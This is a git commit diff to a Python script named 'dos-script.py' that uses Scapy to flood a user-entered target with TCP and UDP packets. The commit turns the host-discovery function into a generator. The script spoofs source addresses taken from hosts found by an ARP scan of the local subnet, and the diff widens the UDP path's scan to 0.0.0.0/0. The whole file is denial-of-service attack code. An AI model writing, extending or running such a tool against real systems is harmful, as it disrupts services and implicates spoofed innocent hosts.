ce2c7b8feba03afb1f2d831178072ff50a738aea
Nata Chikhinashvili <natanatuka33@gmail.com>
2023-12-12 07:45:23 +0400

    feat: change to generator

--- dos-script.py
+++ dos-script.py
@@ -2,25 +2,21 @@ from scapy.all import TCP, IP, sr1, conf, Ether, ARP, srp, UDP
 
 dstaddress = input('Destination address: ')
 flag = input('Flag: ')
-attackprotocol = input('Choose attack protocol')
+attackprotocol = input('Choose attack protocol: ')
 
 class DOS:
     def getIpAddresses(self, target_ip):
         arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
         result = srp(arp_request, timeout=2, iface=None, verbose=False)[0]
-        ipaddresses = [res[1].psrc for res in result]
-        return ipaddresses
+        for res in result:
+            yield res[1].psrc
 
     def sendsynstcp(self):
-        ips = self.getIpAddresses("192.168.1.0/24")
-
-        for ip in ips:
+        for ip in self.getIpAddresses("192.168.1.0/24"):
             p = sr1(IP(src=ip, dst=dstaddress)/TCP(flags=flag))
             p.show()
     
     def sendudp(self,dport):
-        ips = self.getIpAddresses("192.168.1.0/24")
-
-        for ip in ips:
+        for ip in self.getIpAddresses("0.0.0.0/0"):
             p = sr1(IP(src=ip, dst=dstaddress)/UDP(dport))
             p.show()
